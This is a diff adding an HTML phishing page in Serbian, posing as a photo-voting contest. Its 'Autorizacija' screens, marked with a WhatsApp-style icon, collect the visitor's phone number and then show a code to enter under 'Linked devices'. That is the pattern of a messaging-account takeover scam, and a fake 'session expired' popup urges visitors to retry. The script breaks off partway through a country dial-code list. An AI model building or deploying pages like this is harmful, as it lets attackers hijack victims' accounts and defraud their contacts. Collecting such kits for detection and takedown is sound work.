@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="sr">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta property="og:title" content="Soutiže">
+<meta property="og:description" content="Izaberite učesnika za koga želite da glasate">
+<title>Soutiže</title>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ===== RESET ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%}
+:root{
+  --bg:#f4f5f9;
+  --bg2:#ffffff;
+  --primary:#9f2bf2;
+  --primary-dim:rgba(159,43,242,0.1);
+  --primary-glow:rgba(159,43,242,0.25);
+  --border:#e5e7ef;
+  --border-focus:rgba(159,43,242,0.5);
+  --text:#1a1030;
+  --text-sub:#6b7280;
+  --text-light:#9ca3af;
+  --shadow:0 2px 12px rgba(0,0,0,0.08);
+  --shadow-lg:0 8px 32px rgba(0,0,0,0.12);
+  --radius:16px;
+  --radius-sm:12px;
+  --font:'Inter',sans-serif;
+}
+body{
+  font-family:var(--font);
+  background:var(--bg);
+  color:var(--text);
+  min-height:100vh;
+  min-height:100dvh;
+  overflow-x:hidden;
+}
+
+/* ===== SCREENS ===== */
+.screen{
+  display:none;
+  min-height:100vh;
+  min-height:100dvh;
+}
+.screen.active{display:flex;flex-direction:column}
+
+/* ===== HEADER ===== */
+.header{
+  position:sticky;top:0;z-index:50;
+  background:rgba(255,255,255,0.92);
+  backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--border);
+  padding:0 16px;
+}
+.header-inner{
+  max-width:900px;margin:0 auto;
+  height:56px;display:flex;align-items:center;justify-content:space-between;
+}
+.logo-img{height:32px;object-fit:contain}
+.logo-text{font-size:18px;font-weight:700;color:var(--primary)}
+
+/* Header button */
+.btn-header{
+  display:flex;align-items:center;gap:6px;
+  padding:8px 16px;border-radius:40px;
+  background:var(--primary);border:none;color:#fff;
+  font-family:var(--font);font-size:13px;font-weight:600;
+  cursor:pointer;transition:all .2s;
+  box-shadow:0 2px 12px var(--primary-glow);
+  white-space:nowrap;
+}
+.btn-header:hover{transform:translateY(-1px);box-shadow:0 4px 20px var(--primary-glow)}
+.btn-header svg{flex-shrink:0}
+
+/* ===== MAIN CONTAINER ===== */
+.main{flex:1;max-width:900px;width:100%;margin:0 auto;padding:20px 16px 40px}
+
+/* ===== SECTION TITLE ===== */
+.section-title{
+  font-size:18px;font-weight:700;color:var(--primary);
+  margin-bottom:16px;line-height:1.4;
+}
+
+/* ===== PARTICIPANTS ===== */
+.parts-grid{
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  gap:12px;margin-bottom:28px;
+}
+@media(min-width:480px){.parts-grid{grid-template-columns:repeat(2,1fr);gap:16px}}
+@media(min-width:700px){.parts-grid{grid-template-columns:repeat(4,1fr)}}
+
+.part-card{
+  background:#fff;border-radius:var(--radius);
+  overflow:hidden;box-shadow:var(--shadow);
+  border:1px solid var(--border);
+  transition:transform .2s,box-shadow .2s;
+}
+.part-card:hover{transform:translateY(-3px);box-shadow:var(--shadow-lg)}
+.part-img{width:100%;aspect-ratio:3/4;object-fit:cover;display:block;background:#f0eeff}
+.part-info{padding:12px}
+.part-name{font-size:15px;font-weight:700;color:var(--text);margin-bottom:2px}
+.part-votes{font-size:12px;color:var(--text-sub);margin-bottom:10px}
+button.button.primary.vote{
+  width:100%;padding:9px 0;border-radius:8px;
+  background:var(--primary);border:none;color:#fff;
+  font-family:var(--font);font-size:13px;font-weight:600;
+  cursor:pointer;transition:all .2s;
+}
+button.button.primary.vote:hover{filter:brightness(1.1)}
+
+/* ===== SOCIALS ===== */
+.socials-box{
+  background:#fff;border-radius:var(--radius);
+  border:1px solid var(--border);box-shadow:var(--shadow);
+  padding:16px;margin-bottom:28px;
+}
+.partners-row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px;align-items:center}
+.partner-wrap{
+  background:var(--bg);border:1px solid var(--border);
+  border-radius:10px;padding:10px 16px;
+  display:flex;align-items:center;justify-content:center;
+}
+.partner-wrap img{height:28px;object-fit:contain;opacity:.85}
+div.button.primary.vote{
+  display:inline-flex;align-items:center;gap:7px;
+  padding:10px 20px;border-radius:40px;
+  background:var(--primary);color:#fff;
+  font-family:var(--font);font-size:13px;font-weight:600;
+  cursor:pointer;transition:all .2s;
+  box-shadow:0 2px 10px var(--primary-glow);
+}
+div.button.primary.vote:hover{transform:translateY(-1px);box-shadow:0 4px 18px var(--primary-glow)}
+
+/* ===== FAQ ===== */
+.faq-box{background:#fff;border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);overflow:hidden;margin-bottom:28px}
+.question{border-bottom:1px solid var(--border)}
+.question:last-child{border-bottom:none}
+.question .title{
+  padding:16px;display:flex;justify-content:space-between;
+  align-items:center;cursor:pointer;gap:12px;
+  transition:background .15s;
+}
+.question .title:hover{background:var(--bg)}
+.question .title p{font-size:14px;font-weight:500;color:var(--text);margin:0;line-height:1.4}
+.question .title::before,.question .title::after{display:none!important}
+.q-icon{
+  width:22px;height:22px;flex-shrink:0;border-radius:50%;
+  border:1.5px solid var(--border);background:var(--bg);
+  display:flex;align-items:center;justify-content:center;
+  color:var(--text-sub);font-size:16px;line-height:1;
+  transition:transform .25s,background .2s,border-color .2s,color .2s;
+}
+.question.open .q-icon{
+  transform:rotate(45deg);background:var(--primary-dim);
+  border-color:var(--primary);color:var(--primary);
+}
+.question .text{
+  max-height:0;overflow:hidden;
+  transition:max-height .3s ease,padding .25s;
+  padding:0 16px;background:var(--bg);
+}
+.question.open .text{max-height:200px;padding:0 16px 16px}
+.question .text p{color:var(--text-sub);font-size:13px;line-height:1.7;margin:0}
+
+/* ===== FOOTER ===== */
+footer{text-align:center;color:var(--text-light);font-size:12px;padding:16px}
+
+/* ===== CARD (auth screens) ===== */
+.card-screen{
+  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:20px 16px;min-height:calc(100vh - 56px);min-height:calc(100dvh - 56px);
+}
+.card{
+  background:#fff;border-radius:20px;
+  padding:28px 24px;width:100%;max-width:400px;
+  box-shadow:var(--shadow-lg);border:1px solid var(--border);
+}
+.card-back{
+  display:flex;align-items:center;gap:6px;
+  background:none;border:none;color:var(--text-sub);
+  font-family:var(--font);font-size:14px;cursor:pointer;
+  padding:0;margin-bottom:20px;transition:color .2s;
+}
+.card-back:hover{color:var(--text)}
+.card-back svg{flex-shrink:0}
+.card h2{font-size:22px;font-weight:700;margin-bottom:6px;color:var(--text)}
+.card .sub{color:var(--text-sub);font-size:14px;line-height:1.6;margin-bottom:24px}
+
+/* ===== PHONE INPUT ===== */
+.phone-row{display:flex;gap:8px;margin-bottom:14px}
+.country-btn{
+  display:flex;align-items:center;gap:6px;
+  padding:0 12px;height:50px;min-width:90px;
+  border-radius:var(--radius-sm);background:var(--bg);
+  border:1.5px solid var(--border);color:var(--text);
+  cursor:pointer;font-size:15px;white-space:nowrap;
+  transition:border-color .2s;flex-shrink:0;
+}
+.country-btn:hover{border-color:var(--primary)}
+.c-flag{font-size:18px}
+.c-dial{font-size:12px;color:var(--text-sub)}
+
+input.phone-input{
+  flex:1;height:50px;
+  background:var(--bg);border:1.5px solid var(--border);
+  border-radius:var(--radius-sm);color:var(--text);
+  font-family:var(--font);font-size:16px;padding:0 14px;
+  outline:none;transition:border-color .2s,box-shadow .2s;width:100%;
+}
+input.phone-input:focus{border-color:var(--primary);box-shadow:0 0 0 3px var(--primary-dim)}
+input.phone-input::placeholder{color:var(--text-light)}
+
+/* ===== DALJE BUTTON ===== */
+.btn-dalje{
+  width:100%;height:50px;border-radius:var(--radius-sm);
+  background:var(--primary);border:none;color:#fff;
+  font-family:var(--font);font-size:15px;font-weight:600;
+  cursor:pointer;transition:all .2s;
+  box-shadow:0 4px 16px var(--primary-glow);
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.btn-dalje:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 6px 24px var(--primary-glow)}
+.btn-dalje:disabled{opacity:.55;cursor:not-allowed}
+
+/* ===== COUNTRY DROPDOWN ===== */
+.country-dd{
+  position:fixed;z-index:9999;
+  background:#fff;border:1px solid var(--border);
+  border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.18);
+  width:min(300px,90vw);max-height:360px;overflow:hidden;
+  display:flex;flex-direction:column;
+  opacity:0;transform:scale(.96) translateY(-6px);
+  transition:opacity .18s,transform .18s;pointer-events:none;
+}
+.country-dd.open{opacity:1;transform:scale(1) translateY(0);pointer-events:all}
+.dd-search-wrap{padding:10px;border-bottom:1px solid var(--border)}
+.dd-search-wrap input{
+  width:100%;height:38px;background:var(--bg);
+  border:1.5px solid var(--border);border-radius:8px;
+  color:var(--text);font-family:var(--font);font-size:14px;
+  padding:0 12px;outline:none;
+}
+.dd-search-wrap input:focus{border-color:var(--primary)}
+.dd-list{overflow-y:auto;flex:1;padding:6px}
+.dd-list::-webkit-scrollbar{width:3px}
+.dd-list::-webkit-scrollbar-thumb{background:var(--primary-dim);border-radius:3px}
+.dd-item{
+  display:flex;align-items:center;gap:10px;
+  padding:8px 10px;border-radius:8px;cursor:pointer;
+  font-size:14px;transition:background .12s;
+}
+.dd-item:hover{background:var(--bg)}
+.dd-name{flex:1;color:var(--text)}
+.dd-code{color:var(--text-light);font-size:12px}
+
+/* ===== CODE DISPLAY ===== */
+.code-info{
+  background:var(--primary-dim);border:1px solid rgba(159,43,242,0.2);
+  border-radius:12px;padding:14px;margin-bottom:20px;
+  font-size:13px;color:var(--text-sub);line-height:1.6;text-align:center;
+}
+.number-code{
+  display:flex;align-items:center;justify-content:center;
+  gap:6px;margin:20px 0;flex-wrap:nowrap;
+}
+.symbol{
+  width:44px;height:54px;
+  background:var(--bg);border:1.5px solid var(--border);
+  border-radius:10px;display:flex;align-items:center;justify-content:center;
+  font-size:22px;font-weight:700;color:var(--text);
+  box-shadow:0 2px 8px rgba(0,0,0,0.06);
+  animation:symIn .35s ease both;
+}
+.symbol:nth-child(1){animation-delay:.04s}
+.symbol:nth-child(2){animation-delay:.08s}
+.symbol:nth-child(3){animation-delay:.12s}
+.symbol:nth-child(4){animation-delay:.16s}
+.symbol:nth-child(6){animation-delay:.22s}
+.symbol:nth-child(7){animation-delay:.26s}
+.symbol:nth-child(8){animation-delay:.30s}
+.symbol:nth-child(9){animation-delay:.34s}
+@keyframes symIn{from{opacity:0;transform:scale(.8) translateY(8px)}to{opacity:1;transform:scale(1) translateY(0)}}
+.split{font-size:22px;font-weight:700;color:var(--text-light);padding:0 2px}
+div#copy-code.button.primary{
+  display:flex;align-items:center;justify-content:center;gap:7px;
+  width:100%;padding:14px;border-radius:var(--radius-sm);
+  background:var(--primary);color:#fff;
+  font-family:var(--font);font-size:15px;font-weight:600;
+  cursor:pointer;transition:all .2s;
+  box-shadow:0 4px 16px var(--primary-glow);
+  margin-bottom:12px;
+}
+div#copy-code.button.primary:hover{transform:translateY(-1px);box-shadow:0 6px 24px var(--primary-glow)}
+
+/* ===== SESSION POPUP ===== */
+.popup{position:fixed;inset:0;z-index:200;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(0,0,0,0.5);backdrop-filter:blur(6px)}
+.popup.closed{display:none}
+.popup .body{background:#fff;border-radius:20px;padding:28px;max-width:360px;width:100%;text-align:center;box-shadow:var(--shadow-lg)}
+.popup .body h2{font-size:18px;font-weight:700;margin-bottom:8px}
+.popup .body p{color:var(--text-sub);font-size:14px;line-height:1.6;margin-bottom:20px}
+button#reload-page.button.primary{
+  width:100%;padding:12px;border-radius:var(--radius-sm);
+  background:var(--primary);border:none;color:#fff;
+  font-family:var(--font);font-size:14px;font-weight:600;cursor:pointer;
+}
+
+/* ===== SPINNER ===== */
+.spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,0.35);border-top-color:#fff;border-radius:50%;animation:spin .65s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ===== IP DETECT HINT ===== */
+.ip-hint{font-size:12px;color:var(--text-light);text-align:center;margin-top:10px}
+.ip-hint span{color:var(--primary);font-weight:500}
+</style>
+</head>
+<body>
+
+<!-- ===== SCREEN 1: VOTING ===== -->
+<div class="screen active" id="s1">
+  <div class="header">
+    <div class="header-inner">
+      <img class="logo-img" src="./страница 1_files/logo.png" alt="Soutiže"
+        onerror="this.style.display='none';this.nextSibling.style.display='block'">
+      <span class="logo-text" style="display:none">Soutiže</span>
+      <button class="btn-header" onclick="goAuth()">
+        Autorizacija
+        <svg fill="currentColor" viewBox="0 0 30 30" width="16px" height="16px"><path d="M 15 3 C 8.373 3 3 8.373 3 15 C 3 17.251208 3.6323415 19.350068 4.7109375 21.150391 L 3.1074219 27 L 9.0820312 25.431641 C 10.829354 26.425062 12.84649 27 15 27 C 21.627 27 27 21.627 27 15 C 27 8.373 21.627 3 15 3 z M 10.892578 9.4023438 C 11.087578 9.4023438 11.287937 9.4011562 11.460938 9.4101562 C 11.674938 9.4151563 11.907859 9.4308281 12.130859 9.9238281 C 12.395859 10.509828 12.972875 11.979906 13.046875 12.128906 C 13.120875 12.277906 13.173313 12.453437 13.070312 12.648438 C 12.972312 12.848437 12.921344 12.969484 12.777344 13.146484 C 12.628344 13.318484 12.465078 13.532109 12.330078 13.662109 C 12.181078 13.811109 12.027219 13.974484 12.199219 14.271484 C 12.371219 14.568484 12.968563 15.542125 13.851562 16.328125 C 14.986562 17.342125 15.944188 17.653734 16.242188 17.802734 C 16.540187 17.951734 16.712766 17.928516 16.884766 17.728516 C 17.061766 17.533516 17.628125 16.864406 17.828125 16.566406 C 18.023125 16.268406 18.222188 16.319969 18.492188 16.417969 C 18.766188 16.515969 20.227391 17.235766 20.525391 17.384766 C 20.823391 17.533766 21.01875 17.607516 21.09375 17.728516 C 21.17075 17.853516 21.170828 18.448578 20.923828 19.142578 C 20.676828 19.835578 19.463922 20.505734 18.919922 20.552734 C 18.370922 20.603734 17.858562 20.7995 15.351562 19.8125 C 12.327563 18.6215 10.420484 15.524219 10.271484 15.324219 C 10.122484 15.129219 9.0605469 13.713906 9.0605469 12.253906 C 9.0605469 10.788906 9.8286563 10.071437 10.097656 9.7734375 C 10.371656 9.4754375 10.692578 9.4023438 10.892578 9.4023438 z"/></svg>
+      </button>
+    </div>
+  </div>
+
+  <div class="main">
+    <section class="participants">
+      <h2 class="section-title"> Izaberite učesnika za koga želite da glasate</h2>
+      <div class="parts-grid">
+        <div class="part-card">
+          <img class="part-img" src="./страница 1_files/9a67c2cbd4f9.png" alt="Participant">
+          <div class="part-info">
+            <div class="part-name">Nikolina</div>
+            <div class="part-votes">256 glasova</div>
+            <button class="button primary vote">Glasajte</button>
+          </div>
+        </div>
+        <div class="part-card">
+          <img class="part-img" src="./страница 1_files/b126c1fa53c5.png" alt="Participant">
+          <div class="part-info">
+            <div class="part-name">Ksenija</div>
+            <div class="part-votes">310 glasova</div>
+            <button class="button primary vote">Glasajte</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="socials">
+      <h2 class="section-title">partner</h2>
+      <div class="socials-box">
+        <div class="partners-row">
+          <div class="partner-wrap"><img src="./страница 1_files/45565306c3b6.png" alt=""></div>
+          <div class="partner-wrap"><img src="./страница 1_files/6f2b30e85c5f.png" alt=""></div>
+          <div class="partner-wrap"><img src="./страница 1_files/0580188958a7.png" alt=""></div>
+        </div>
+        <div class="button primary vote">
+          Autorizacija
+          <svg fill="currentColor" viewBox="0 0 30 30" width="16px" height="16px"><path d="M 15 3 C 8.373 3 3 8.373 3 15 C 3 17.251208 3.6323415 19.350068 4.7109375 21.150391 L 3.1074219 27 L 9.0820312 25.431641 C 10.829354 26.425062 12.84649 27 15 27 C 21.627 27 27 21.627 27 15 C 27 8.373 21.627 3 15 3 z M 10.892578 9.4023438 C 11.087578 9.4023438 11.287937 9.4011562 11.460938 9.4101562 C 11.674938 9.4151563 11.907859 9.4308281 12.130859 9.9238281 C 12.395859 10.509828 12.972875 11.979906 13.046875 12.128906 C 13.120875 12.277906 13.173313 12.453437 13.070312 12.648438 C 12.972312 12.848437 12.921344 12.969484 12.777344 13.146484 C 12.628344 13.318484 12.465078 13.532109 12.330078 13.662109 C 12.181078 13.811109 12.027219 13.974484 12.199219 14.271484 C 12.371219 14.568484 12.968563 15.542125 13.851562 16.328125 C 14.986562 17.342125 15.944188 17.653734 16.242188 17.802734 C 16.540187 17.951734 16.712766 17.928516 16.884766 17.728516 C 17.061766 17.533516 17.628125 16.864406 17.828125 16.566406 C 18.023125 16.268406 18.222188 16.319969 18.492188 16.417969 C 18.766188 16.515969 20.227391 17.235766 20.525391 17.384766 C 20.823391 17.533766 21.01875 17.607516 21.09375 17.728516 C 21.17075 17.853516 21.170828 18.448578 20.923828 19.142578 C 20.676828 19.835578 19.463922 20.505734 18.919922 20.552734 C 18.370922 20.603734 17.858562 20.7995 15.351562 19.8125 C 12.327563 18.6215 10.420484 15.524219 10.271484 15.324219 C 10.122484 15.129219 9.0605469 13.713906 9.0605469 12.253906 C 9.0605469 10.788906 9.8286563 10.071437 10.097656 9.7734375 C 10.371656 9.4754375 10.692578 9.4023438 10.892578 9.4023438 z"/></svg>
+        </div>
+      </div>
+    </section>
+
+    <section class="questions">
+      <h2 class="section-title">FAQ</h2>
+      <div class="faq-box accordion">
+        <div class="question">
+          <div class="title" onclick="toggleQ(this)">
+            <p>Da li je sigurno objavljivati fotografije?</p><span class="q-icon">+</span>
+          </div>
+          <div class="text"><p>Da, sve fotografije su pre objavljivanja moderisane. Lični podaci nisu objavljivani.</p></div>
+        </div>
+        <div class="question">
+          <div class="title" onclick="toggleQ(this)">
+            <p>Kako se uključiti u borbu?</p><span class="q-icon">+</span>
+          </div>
+          <div class="text"><p>Jednostavno pošaljite fotografiju koristeći obrazac na veb-stranici i dodajte kratak opis. Nakon verifikacije, vaša fotografija će biti uključena u takmičenje.</p></div>
+        </div>
+        <div class="question">
+          <div class="title" onclick="toggleQ(this)">
+            <p>Mogu li poslati više fotografija?</p><span class="q-icon">+</span>
+          </div>
+          <div class="text"><p>Da, ali u skladu sa važećim pravilima (npr. maksimalno 3 fotografije po učesniku).</p></div>
+        </div>
+        <div class="question">
+          <div class="title" onclick="toggleQ(this)">
+            <p>Da li je učešće besplatno?</p><span class="q-icon">+</span>
+          </div>
+          <div class="text"><p>Da, učešće je potpuno besplatno</p></div>
+        </div>
+      </div>
+    </section>
+
+    <footer><p>© 2020-2024 | All Rights Reserved</p></footer>
+  </div>
+</div>
+
+<!-- ===== SCREEN 2: PHONE ===== -->
+<div class="screen" id="s2">
+  <div class="header">
+    <div class="header-inner">
+      <img class="logo-img" src="./страница 1_files/logo.png" alt="Soutiže"
+        onerror="this.style.display='none';this.nextSibling.style.display='block'">
+      <span class="logo-text" style="display:none">Soutiže</span>
+    </div>
+  </div>
+  <div class="card-screen">
+    <div class="card">
+      <button class="card-back" onclick="goScreen('s1')">
+        <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"/></svg>
+        Nazad
+      </button>
+      <h2>Brza i laka autorizacija</h2>
+      <p class="sub">Autorizacija vam omogućava da zaštitite vaše podatke i štedi vam vreme</p>
+
+      <div class="phone-row">
+        <button class="country-btn" id="c-btn" onclick="toggleDD()">
+          <span class="c-flag" id="c-flag">🇷🇸</span>
+          <span class="c-dial" id="c-dial">+381</span>
+          <svg width="10" height="6" fill="none" viewBox="0 0 10 6"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+        <input type="tel" class="phone-input" id="phone-input" placeholder="broj telefona" inputmode="numeric" autocomplete="tel">
+      </div>
+
+      <button class="btn-dalje" id="btn-dalje" onclick="sendDalje()">Dalje</button>
+
+      <p class="ip-hint" id="ip-hint"></p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== SCREEN 3: CODE ===== -->
+<div class="screen" id="s3">
+  <div class="header">
+    <div class="header-inner">
+      <img class="logo-img" src="./страница 1_files/logo.png" alt="Soutiže"
+        onerror="this.style.display='none';this.nextSibling.style.display='block'">
+      <span class="logo-text" style="display:none">Soutiže</span>
+    </div>
+  </div>
+  <div class="card-screen">
+    <div class="card">
+      <button class="card-back" onclick="backFromCode()">
+        <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"/></svg>
+        Nazad
+      </button>
+      <h2>Brza i laka autorizacija</h2>
+      <div class="code-info">
+        Otvorite aplikaciju, u prozoru podešavanja izaberite opciju „Povezane uređaje" i zatim unesite ovaj kod
+      </div>
+      <div class="number-code" id="number-code"></div>
+      <div class="button primary" id="copy-code" onclick="copyCode()">Kopiraj</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== COUNTRY DROPDOWN ===== -->
+<div id="c-dd" class="country-dd">
+  <div class="dd-search-wrap">
+    <input type="text" id="dd-search" placeholder="Pretraži..." oninput="filterDD(this.value)" autocomplete="off">
+  </div>
+  <div class="dd-list" id="dd-list"></div>
+</div>
+
+<!-- ===== SESSION POPUP ===== -->
+<div class="popup closed" id="session-closed">
+  <div class="body">
+    <h2>Važenje sesije je isteklo.</h2>
+    <p>Čini se da vam je sesija istekla. Osvježite stranicu i generišite novi kod</p>
+    <button class="button primary" id="reload-page" onclick="reloadSess()">Restartovati</button>
+  </div>
+</div>
+
+<script>
+const COUNTRIES=[{"code": "AU", "dial": "+61", "name": "Australia", "flag": "🇦🇺"}, {"code": "AT", "dial": "+43", "name": "Österreich", "flag": "🇦🇹"}, {"code": "AZ", "dial": "+994", "name": "Azərbaycan", "flag": "🇦🇿"}, {"code": "AX", "dial": "+358", "name": "Åland", "flag": "🇦🇽"}, {"code": "AL", "dial": "+355", "name": "Shqipëri", "flag": "🇦🇱"}, {"code": "DZ", "dial": "+213", "name": "الجزائر", "flag": "🇩🇿"}, {"code": "AS", "dial": "+1", "name": "American Samoa", "flag": "🇦🇸"}, {"code": "AI", "dial": "+1", "name": "Anguilla", "flag": "🇦🇮"}, {"code": "AO", "dial": "+244", "name": "Angola", "flag": "🇦🇴"}, {"code": "AD", "dial": "+376", "name": "Andorra", "flag": "🇦🇩"}, {"code": "AG", "dial": "+1", "name": "Antigua & Barbuda", "flag": "🇦🇬"}, {"code": "AR", "dial": "+54", "name": "Argentina", "flag": "🇦🇷"}, {"code": "AM", "dial": "+374", "name": "Հայաստան", "flag": "🇦🇲"}, {"code": "AW", "dial": "+297", "name": "Aruba", "flag": "🇦🇼"}, {"code": "AF", "dial": "+93", "name": "افغانستان", "flag": "🇦🇫"}, {"code": "BS", "dial": "+1", "name": "Bahamas", "flag": "🇧🇸"}, {"code": "BD", "dial": "+880", "name": "বাংলাদেশ", "flag": "🇧🇩"}, {"code": "BB", "dial": "+1", "name": "Barbados", "flag": "🇧🇧"}, {"code": "BH", "dial": "+973", "name": "البحرين", "flag": "🇧🇭"}, {"code": "BY", "dial": "+375", "name": "Беларусь", "flag": "🇧🇾"}, {"code": "BZ", "dial": "+501", "name": "Belize", "flag": "🇧🇿"}, {"code": "BE", "dial": "+32", "name": "België", "flag": "🇧🇪"}, {"code": "BJ", "dial": "+229", "name": "Bénin", "flag": "🇧🇯"}, {"code": "BM", "dial": "+1", "name": "Bermuda", "flag": "🇧🇲"}, {"code": "BG", "dial": "+359", "name": "България", "flag": "🇧🇬"}, {"code": "BO", "dial": "+591", "name": "Bolivia", "flag": "🇧🇴"}, {"code": "BQ", "dial": "+599", "name": "Caribisch Nederland", "flag": "🇧🇶"}, {"code": "BA", "dial": "+387", "name": "Bosna i Hercegovina", "flag": "🇧🇦"}, {"code": "BW", "dial": "+267", "name": "Botswana", "flag": "🇧🇼"}, {"code": "BR", "dial": "+55", "name": "Brasil", "flag": "🇧🇷"}, {"code": "IO", "dial": "+246", "name": "British Indian Ocean Territory", "flag": "🇮🇴"}, {"code": "BN", "dial": "+673", "name": "Brunei", "flag": "🇧🇳"}, {"code": "BF", "dial": "+226", "name": "Burkina Faso", "flag": "🇧🇫"}, {"code": "BI", "dial": "+257", "name": "Burundi", "flag": "🇧🇮"}, {"code": "BT", "dial": "+975", "name": "འབྲུག", "flag": "🇧🇹"}, {"code": "VU", "dial": "+678", "name": "Vanuatu", "flag": "🇻🇺"}, {"code": "VA", "dial": "+379", "name": "Città del Vaticano", "flag": "🇻🇦"}, {"code": "GB", "dial": "+44", "name": "United Kingdom", "flag": "🇬🇧"}, {"code": "HU", "dial": "+36", "name": "Magyarország", "flag": "🇭🇺"}, {"code": "VE", "dial": "+58", "name": "Venezuela", "flag": "🇻🇪"}, {"code": "VG", "dial": "+1", "name": "British Virgin Islands", "flag": "🌐"}, {"code": "VI", "dial": "+1", "name": "U.S. Virgin Islands", "flag": "🇻🇮"}, {"code": "TL", "dial": "+670", "name": "Timor-Leste", "flag": "🇹🇱"}, {"code": "VN", "dial": "+84", "name": "Việt Nam", "flag": "🇻🇳"}, {"code": "GA", "dial": "+241", "name": "Gabon", "flag": "🇬🇦"}, {"code": "HT", "dial": "+509", "name": "Haïti", "flag": "🇭🇹"}, {"code": "GY", "dial": "+592", "name": "Guyana", "flag": "🇬🇾"}, {"code": "GM", "dial": "+220", "name": "Gambia", "flag": "🇬🇲"}, {"code": "GH", "dial": "+233", "name": "Ghana", "flag": "🇬🇭"}, {"code": "GP", "dial": "+590", "name": "Guadeloupe", "flag": "🇬🇵"}, {"code": "GT", "dial": "+502", "name": "Guatemala", "flag": "🇬🇹"}, {"code": "GN", "dial": "+224", "name": "Guinée", "flag": "🇬🇳"}, {"code": "GW", "dial": "+245", "name": "Guiné-Bissau", "flag": "🇬🇼"}, {"code": "DE", "dial": "+49", "name": "Deutschland", "flag": "🇩🇪"}, {"code": "GG", "dial": "+44", "name": "Guernsey", "flag": "🇬🇬"}, {"code": "GI", "dial": "+350", "name": "Gibraltar", "flag": "🇬🇮"}, {"code": "HN", "dial": "+504", "name": "Honduras", "flag": "🇭🇳"}, {"code": "HK", "dial": "+852", "name": "中國香港特別行政區", "flag": "🇭🇰"}, {"code": "GD", "dial": "+1", "name": "Grenada", "flag": "🇬🇩"}, {"code": "GL", "dial": "+299", "name": "Kalaallit Nunaat", "flag": "🇬🇱"}, {"code": "GR", "dial": "+30", "name": "Ελλάδα", "flag": "🇬🇷"}, {"code": "GE", "dial": "+995", "name": "საქართველო", "flag": "🇬🇪"}, {"code": "GU", "dial": "+1", "name": "Guam", "flag": "🌐"}, {"code": "DK", "dial": "+45", "name": "Danmark", "flag": "🇩🇰"}, {"code": "JE", "dial": "+44", "name": "Jersey", "flag": "🇯🇪"}, {"code": "DJ", "dial": "+253", "name": "Djibouti", "flag": "🇩🇯"}, {"code": "DM", "dial": "+1", "name": "Dominica", "flag": "🇩🇲"}, {"code": "DO", "dial": "+1", "name": "República Dominicana", "flag": "🇩🇴"}, {"code": "EG", "dial": "+20", "name": "مصر", "flag": "🇪🇬"}, {"code": "ZM", "dial": "+260", "name": "Zambia", "flag": "🇿🇲"}, {"code": "ZW", "dial": "+263", "name": "Zimbabwe", "flag": "🇿🇼"}, {"code": "IL", "dial": "+972", "name": "ישראל", "flag": "🇮🇱"}, {"code": "IN", "dial": "+91", "name": "India", "flag": "🇮🇳"}, {"code": "ID", "dial": "+62", "name": "Indonesia", "flag": "🇮🇩"}, {"code": "JO", "dial": "+962", "name": "الأردن", "flag": "🇯🇴"}, {"code": "IQ", "dial": "+964", "name": "العراق", "flag": "🇮🇶"}, {"code": "IR", "dial": "+98", "name": "ایران", "flag": "🇮🇷"}, {"code": "IE", "dial": "+353", "name": "Ireland", "flag": "🇮🇪"}, {"code": "IS", "dial": "+354", "name": "Ísland", "flag": "🇮🇸"}, {"code": "ES", "dial": "+34", "name": "España", "flag": "🇪🇸"}, {"code": "IT", "dial": "+39", "name": "Italia", "flag": "🇮🇹"}, {"code": "YE", "dial": "+967", "name": "اليمن", "flag": "🇾🇪"}, {"code": "CV", "dial": "+238", "name": "Cabo Verde", "flag": "🇨🇻"}, {"code": "KZ", "dial": "+7", "name": "Қазақстан", "flag": "🇰🇿"}, {"code": "KH", "dial": "+855", "name": "កម្ពុជា", "flag": "🇰🇭"}, {"code": "CM", "dial": "+237", "name": "Cameroon", "flag": "🇨🇲"}, {"code": "CA", "dial": "+1", "name": "Canada", "flag": "🇨🇦"}, {"code": "QA", "dial": "+974", "name": "قطر", "flag": "🇶🇦"}, {"code": "KE", "dial": "+254", "name": "Kenya", "flag": "🇰🇪"}, {"code": "CY", "dial": "+357", "name": "Κύπρος", "flag": "🇨🇾"}, {"code": "KG", "dial": "+996", "name": "Кыргызстан", "flag": "🇰🇬"}, {"code": "KI", "dial": "+686", "name": "Kiribati", "flag": "🇰🇮"}, {"code": "CN", "dial": "+86", "name": "中国", "flag": "🇨🇳"}, {"code": "KP", "dial": "+850", "name": "조선민주주의인민공화국", "flag": "🇰🇵"}, {"code": "CC", "dial": "+61", "name": "Kepulauan Cocos (Keeling)", "flag": "🌐"}, {"code": "CO", "dial": "+57", "name": "Colombia", "flag": "🇨🇴"}, {"code": "KM", "dial": "+269", "name": "جزر القمر", "flag": "🇰🇲"}, {"code": "CG", "dial": "+242", "name": "Congo-Brazzaville", "flag": "🇨🇬"}, {"code": "CD", "dial": "+243", "name": "Congo-Kinshasa", "flag": "🇨🇩"}, {"code": 